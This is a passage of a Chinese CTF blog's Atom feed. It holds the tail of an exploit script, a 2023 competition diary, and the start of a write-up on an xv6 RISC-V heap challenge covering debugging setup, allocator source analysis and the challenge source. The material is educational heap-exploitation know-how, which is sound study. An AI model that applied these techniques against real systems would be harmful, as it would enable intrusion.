class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://bbs.kanxue.com/thread-269533.htm">https://bbs.kanxue.com/thread-269533.htm</a><br><a href="https://www.anquanke.com/post/id/246929">https://www.anquanke.com/post/id/246929</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/129800670">https://blog.csdn.net/qq_45323960&#x2F;article&#x2F;details&#x2F;129800670</a><br><a href="https://www.anquanke.com/post/id/241104#h2-3">https://www.anquanke.com/post/id/241104#h2-3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实就是对各位大佬博客的各种摘抄和总结···，方便自己以后做题&lt;/p&gt;
&lt;h2 id=&quot;结构体&quot;&gt;&lt;a href=&quot;#结构体&quot; class=&quot;headerlink&quot; title=&quot;结构体&quot;&gt;&lt;/a&gt;结构体&lt;/h2&gt;&lt;p&gt;chunk:&lt;/p&gt;
&lt;figure class=&quot;h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2023小琐碎记录贴</title>
    <link href="https://qanux.github.io/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/"/>
    <id>https://qanux.github.io/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/</id>
    <published>2023-12-26T16:00:00.000Z</published>
    <updated>2024-03-14T16:43:06.209Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023-3-27"><a href="#2023-3-27" class="headerlink" title="2023&#x2F;3&#x2F;27"></a>2023&#x2F;3&#x2F;27</h1><p>加入<code>Sloth</code>咯！！！<br>上学期<code>XSCTF</code>联合招新赛爆<code>0</code>后就没有在<code>CTF</code>走下去的打算，可是寒假在暨大的<code>i_corner</code>师傅的鼓励下打算再努力一把，刷了<code>2</code>个多月的<code>Crypto</code>和<code>misc</code>，最后在选拔赛拿了全场一血(我最爱的RSA)，太感动了<code>QAQ</code><br>不过也感受到了差距，第一名和第二名是大二的学长，分数比我高好多，同级的也有一位逆向好厉害<code>QAQ</code><br>搏一搏，单车变摩托，我要超越他们！！！！</p><h1 id="2023-4-2"><a href="#2023-4-2" class="headerlink" title="2023&#x2F;4&#x2F;2"></a>2023&#x2F;4&#x2F;2</h1><p>正式开始学<code>pwn</code>了捏  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/1.png" class="" title="我的图图呢">  <h1 id="2023-5-28"><a href="#2023-5-28" class="headerlink" title="2023&#x2F;5&#x2F;28"></a>2023&#x2F;5&#x2F;28</h1><p>第一次打比赛，给打烂了捏&gt;_&lt;<br>打了一个月的<code>ret2libc</code>,才发现<code>pwn</code>原来还有这么多东西，看来要狠狠的卷了  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/2.png" class="" title="我的图图呢">  <h1 id="2023-8-26"><a href="#2023-8-26" class="headerlink" title="2023&#x2F;8&#x2F;26"></a>2023&#x2F;8&#x2F;26</h1><p>好耶，闭关一段时间再参加比赛(蓝帽杯)，出了一道堆题，成就感拉满！！！！！！</p><h1 id="2023-9-10"><a href="#2023-9-10" class="headerlink" title="2023&#x2F;9&#x2F;10"></a>2023&#x2F;9&#x2F;10</h1><p>数模国赛逆大天，首先是有<code>78w</code>行数据，脚本跑一次好好几分钟，其次是题目完全没有思路，找不到适用的模型<code>&gt;_&lt;</code>，完全靠队友带飞<code>Orz</code></p><h1 id="2023-10-15"><a href="#2023-10-15" class="headerlink" title="2023&#x2F;10&#x2F;15"></a>2023&#x2F;10&#x2F;15</h1><p>香山杯太亏了，差一点点(几分)进决赛，问题出在<code>pwn</code>手(我),<code>pwn</code>差一题<code>Ak</code>，剩下一题<code>python pwn</code>，漏洞出现在<code>python</code>程序调用的函数包，函数包用<code>C++</code>写的，存在格式化字符串漏洞和栈溢出，可是我本地启动不了程序，调试不了<code>QAQ</code>，血亏，我背锅。赛后发现要使用<code>python3.7</code>才可以启动程序，裂大开<br>后期补充：决赛<code>awdp</code>的<code>3</code>题<code>pwn</code>我都会做，没去线下太可惜了，哦对，我还没进过线下(卑微)</p><h1 id="2023-10-16"><a href="#2023-10-16" class="headerlink" title="2023&#x2F;10&#x2F;16"></a>2023&#x2F;10&#x2F;16</h1><p>XSCTF联合招新赛结束拉，嘿嘿，第一次出题(一道简单的libc-2.27的unlink)，居然没人做？完了，要给<code>JANlittle</code>拉去喂鱼了</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/3.png" class="" title="我的图图呢">  <p>pwn的解题情况惨不忍睹，别后继无人啊QAQ(以后谁来带我)<br>133nson和Csome师兄出的<code>pwn</code>题质量是真的高，我要好好学习</p><h1 id="2023-11-9"><a href="#2023-11-9" class="headerlink" title="2023&#x2F;11&#x2F;9"></a>2023&#x2F;11&#x2F;9</h1><p>嘿嘿，<code>CS</code>杯选拔赛，欺负老实人<br>谁说算法只能用<code>C/C++</code>打的，上<code>python</code>！！！！！<br>4道题15分钟干了3题，而且2题一血，不过最后一题用深搜超时，到最后都没有做出来，哎，算法太烂了，而且好久没看了，人菜瘾大xD</p><h1 id="2023-12-9"><a href="#2023-12-9" class="headerlink" title="2023&#x2F;12&#x2F;9"></a>2023&#x2F;12&#x2F;9</h1><p>PolarCTF打爽了 Solved:24 grade:7000 rank:3<br>11题pwn全都会(有一题<code>house of orange</code>嫌麻烦且分不高没打，结果给<code>jelasin</code>师傅骂了<code>QAQ</code>)，还拿了题唯一血(预期解为改<code>printf</code>的格式表？不存在的，打<code>IO</code>才是<code>yyds</code>！！！)<br>Crypto全是脑洞题，没有数学题，差评QAQ，只会数学题&gt;_&lt;<br>有题逆向做出来后怎么交都是错，结束后才发现<code>flag</code>要进行<code>md5</code>加密，逆天(貌似题目上也没有说明XD)</p><h1 id="2023-12-10"><a href="#2023-12-10" class="headerlink" title="2023&#x2F;12&#x2F;10"></a>2023&#x2F;12&#x2F;10</h1><p>给<code>Csome</code>师兄拉去<code>S1uM4i</code>打<code>TCTF/0CTF</code>,坐大牢！！！题目过于逆天，连什么<code>ios kernel</code>都来了，感觉最少还要再练一年才能在这个比赛上做出题。<br>才大二，还来得及，冲！！！！</p><h1 id="2023-12-17"><a href="#2023-12-17" class="headerlink" title="2023&#x2F;12&#x2F;17"></a>2023&#x2F;12&#x2F;17</h1><p>强网杯太逆天了啊，学会了各种<code>io file</code>攻击以为可以乱杀，结果发现题目都是<code>VM</code>类型，完全看不懂逆向，看来<code>kernel</code>要延后一段时间再学了，先把<code>vmpwn</code>给拿下<br>比赛有点可惜，差一点进决赛<code>QAQ</code>，归根到底是我的问题，队友很<code>c</code>了，要是我能把那两题简单<code>pwn</code>做出来就能进决赛了(<code>WTOA</code>和<code>A-rtsp</code> 都是看不懂逆向，我的<code>500</code>分鸭<code>QAQ</code>)，寒假给我狠狠卷！！！！ 备战期末，这学期绩点必须给我高高高！！！！</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/4.png" class="" title="我的图图呢">  <p>虽然很遗憾，不过也学到了怎么通过<code>puts</code>函数来调用<code>io</code>链，也算是一种所获吧，强网杯已经没有想进决赛的欲望了，太卷了<br>感觉<code>AFL fuzz</code>技术也要学学，在很多题目上都能用到</p><h1 id="2023-12-28"><a href="#2023-12-28" class="headerlink" title="2023&#x2F;12&#x2F;28"></a>2023&#x2F;12&#x2F;28</h1><p>好好好，上大学一年多，已经变成<code>IT</code>的形状了</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/5.png" class="" title="我的图图呢">  <p>考完<code>java</code>放松的时候翻了一下上学期校队送的<code>《CTF权威指南 pwn篇》</code>,发现里面的内容确实基础和简单，不过当时买回来看的时候感觉在看天书，真属于是不会时看天书，会时用不上了<br>里面的很多堆利用手法都过时了，不过感觉依然可以作为一本很好很系统的<code>pwn</code>入门书籍，期末后看看能不能找到想学<code>pwn</code>的学弟，把这本书送他并天天督促他学<code>pwn</code>(已经有一位学<code>web</code>的学弟成为受害者了)，好书不能浪费(其实是怕以后没人带&gt;_&lt;)</p><h1 id="2024-1-1"><a href="#2024-1-1" class="headerlink" title="2024&#x2F;1&#x2F;1"></a>2024&#x2F;1&#x2F;1</h1><p>2023年过的太失败了，2024给我冲！！！我要变强！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023-3-27&quot;&gt;&lt;a href=&quot;#2023-3-27&quot; class=&quot;headerlink&quot; title=&quot;2023&amp;#x2F;3&amp;#x2F;27&quot;&gt;&lt;/a&gt;2023&amp;#x2F;3&amp;#x2F;27&lt;/h1&gt;&lt;p&gt;加入&lt;code&gt;Sloth&lt;/code&gt;咯！</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>记一道risc-v架构xv6操作系统的堆</title>
    <link href="https://qanux.github.io/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/"/>
    <id>https://qanux.github.io/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/</id>
    <published>2023-11-17T16:00:00.000Z</published>
    <updated>2024-05-28T16:38:21.235Z</updated>
    
    <content type="html"><![CDATA[<p>附件：<a href="https://github.com/Qanux/uheap">https://github.com/Qanux/uheap</a><br>这是一道<code>133nson</code>师兄出的题(太强啦),看了后只能说自己的见识还是太少了。<br>这一道是<code>xv6</code>系统的堆题，附件已经给出了一个完整的<code>qemu</code>环境，只要输入<code>./run.sh</code>即可启动程序<br>题目有一个<code>hint</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">This challenge is running on the xv6 system. (Attention: its heap allocator is different from GLIBC)</span><br><span class="line">You can get the xv6 source files on https://github.com/mit-pdos/xv6-riscv</span><br><span class="line">You can run this challenge locally using the command &#x27;./run.sh&#x27; and your goal is to PWN the binary chal</span><br><span class="line">To make things simple, the binary file is compiled with debug_info and I have left its source code in chal.c. This means you can use qemu and gdb-multiarch(or other debuggers) for source level debugging if necessary. (You just need to add &#x27;-S -gdb tcp::26000&#x27; to the qemu parameter in the file run.sh then you can start gdb for local debugging)</span><br><span class="line">Here are some useful gdb commands. You can write them in the file .gdbinit and start gdb with the command &#x27;gdb-multiarch -x .gdbinit&#x27;</span><br><span class="line"></span><br><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line"></span><br><span class="line">If you have any problem about the remote environment, please contact the admin. Have fun!</span><br></pre></td></tr></table></figure><p>由于<code>elf</code>文件是附带调试信息编译的，这大大方便了我们进行动态调试</p><h3 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h3><p>相信很多萌新还不知道怎么进行调试，这里就进行傻瓜式教学<br>首先在<code>github</code>上面下载<code>umalloc.c</code>文件(<code>hint</code>文件上写明了)，然后将该文件放入在和<code>chal</code>同一个路径下<br>然后将<code>run.sh</code>文件中的内容进行修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">LD_LIBRARY_PATH=./depend exec ./qemu-system-riscv64 \</span><br><span class="line">        -machine virt \</span><br><span class="line">        -bios none \</span><br><span class="line">        -kernel kernel \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -smp 3 \</span><br><span class="line">        -nographic \</span><br><span class="line">        -drive file=fs.img,if=none,format=raw,id=x0 \</span><br><span class="line">        -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 \</span><br><span class="line">        -monitor /dev/null \</span><br><span class="line">        -S -gdb tcp::26000</span><br></pre></td></tr></table></figure><p>此时通过<code>./run.sh</code>来启动，然后再重新打开另外一个终端，进入到<code>chal</code>文件的路径下，通过<code>gdb-multiarch</code>，然后依次输入下面的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line">b main</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>此时即可进行调试，不过我们不能向平时一样通过<code>bin</code>、<code>stack</code>这些指令来查看堆内存(其实我也不知道怎么看，请求大佬指教)，不过x<code>/16gx</code> 这一些基础的指令还是可以使用</p><h3 id="xv6堆管理分析"><a href="#xv6堆管理分析" class="headerlink" title="xv6堆管理分析"></a>xv6堆管理分析</h3><p>首先来看看<code>xv6</code>中的堆块长什么样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">        uint size;</span><br><span class="line">    &#125; s;</span><br><span class="line">    Align x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到堆块的结构和我们平时<code>glibc</code>中的不一样，他没有<code>prev_size</code>，取而代之的是堆块的指针，我们可以猜到这个指针因该和我们的<code>fd</code>指针类似(储存在<code>free</code>后的链表中的下一个<code>free</code>的堆块的堆头的位置)<br>umalloc.c(<a href="https://github.com/mit-pdos/xv6-riscv">https://github.com/mit-pdos/xv6-riscv</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory allocator by Kernighan and Ritchie,</span></span><br><span class="line"><span class="comment">// The C programming Language, 2nd ed.  Section 8.7.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">    uint size;</span><br><span class="line">  &#125; s;</span><br><span class="line">  Align x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">header</span> <span class="title">Header</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header base;</span><br><span class="line"><span class="type">static</span> Header *freep;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">free</span><span class="params">(<span class="type">void</span> *ap)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *bp, *p;</span><br><span class="line"></span><br><span class="line">  bp = (Header*)ap - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">    <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span>(bp + bp-&gt;s.size == p-&gt;s.ptr)&#123;</span><br><span class="line">    bp-&gt;s.size += p-&gt;s.ptr-&gt;s.size;</span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">  <span class="keyword">if</span>(p + p-&gt;s.size == bp)&#123;</span><br><span class="line">    p-&gt;s.size += bp-&gt;s.size;</span><br><span class="line">    p-&gt;s.ptr = bp-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    p-&gt;s.ptr = bp;</span><br><span class="line">  freep = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header*</span><br><span class="line"><span class="title function_">morecore</span><span class="params">(uint nu)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  Header *hp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(nu &lt; <span class="number">4096</span>)</span><br><span class="line">    nu = <span class="number">4096</span>;</span><br><span class="line">  p = sbrk(nu * <span class="keyword">sizeof</span>(Header));</span><br><span class="line">  <span class="keyword">if</span>(p == (<span class="type">char</span>*)<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hp = (Header*)p;</span><br><span class="line">  hp-&gt;s.size = nu;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)(hp + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> freep;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>*</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(uint nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *p, *prevp;</span><br><span class="line">  uint nunits;</span><br><span class="line"></span><br><span class="line">  nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>((prevp = freep) == <span class="number">0</span>)&#123;</span><br><span class="line">    base.s.ptr = freep = prevp = &amp;base;</span><br><span class="line">    base.s.size = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(p = prevp-&gt;s.ptr; ; prevp = p, p = p-&gt;s.ptr)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;s.size &gt;= nunits)&#123;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;s.size == nunits)</span><br><span class="line">        prevp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        p-&gt;s.size -= nunits;</span><br><span class="line">        p += p-&gt;s.size;</span><br><span class="line">        p-&gt;s.size = nunits;</span><br><span class="line">      &#125;</span><br><span class="line">      freep = prevp;</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">void</span>*)(p + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == freep)</span><br><span class="line">      <span class="keyword">if</span>((p = morecore(nunits)) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们侧重看一下堆块大小的计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>大概就是原本的堆块大小减一加上一个堆头结构的大小后除以堆头的大小再向上取整（比如申请<code>0x19</code>大小的堆块计算出的<code>size</code>为<code>3</code>，申请<code>0x30</code>的堆块计算出的<code>size</code>为<code>4</code>）</p><h4 id="malloc函数"><a href="#malloc函数" class="headerlink" title="malloc函数"></a>malloc函数</h4><p>在<code>malloc</code>函数中，先根据申请的堆块计算出相应的堆块大小，若<code>free</code>链表的表头为<code>0</code>（<code>free</code>链表尚未初始化，则会将静态全局变量<code>base</code>的地址赋值给<code>free</code>的表头指针<code>freep</code>）。然后会从<code>prevp-&gt;s.ptr</code>（表头后的第一个堆块指针）开始顺着<code>s.ptr</code>遍历<code>free</code>链表，若遇到比待申请的堆块大小大的堆块，则会直接切分该堆块，将前一部分返回，后一部分留在链表内；若遇到<code>size</code>刚好符合需求的，则将其脱链后直接返回；若遍历完整个链表仍未遇到可以进行分配的<code>free</code>堆块，则会调用<code>morecore</code>函数向系统申请更多的内存。</p><h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p>在<code>free</code>函数中，会先遍历<code>free</code>链表，若途中遇到待释放的堆块地址处于链表中的两个<code>free</code>堆块之间的话，则会提前退出，否则等待链表被遍历完一轮之后退出（实际上该链表为一个单向循环链表）。然后检查该堆块是否有前&#x2F;后向相邻的<code>free</code>堆块，若有则进行前&#x2F;后向合并，若无则将其直接插入到<code>free</code>链表中。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>查看保护机制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop/uheap$ checksec chal</span><br><span class="line">[!] Did not find any GOT entries</span><br><span class="line">[*] &#x27;/mnt/d/desktop/uheap/chal&#x27;</span><br><span class="line">    Arch:     riscv64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>只开启的<code>NX enabled</code>(<code>133nson</code>：“送分题”)<br>出题人比较友好，直接给出了题目源码<br>chal.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *arr[<span class="number">4</span>];</span><br><span class="line"><span class="type">void</span> *record;</span><br><span class="line"><span class="type">int</span> chance = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banner</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;         __\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  __  __/ /_  ___  ____ _____\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; / / / / __ \\/ _ \\/ __ `/ __ \\\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;/ /_/ / / / /  __/ /_/ / /_/ /\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\\__,_/_/ /_/\\___/\\__,_/ .___/\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;                     /_/\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. add\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. delete\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3. ???\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readline</span><span class="params">(<span 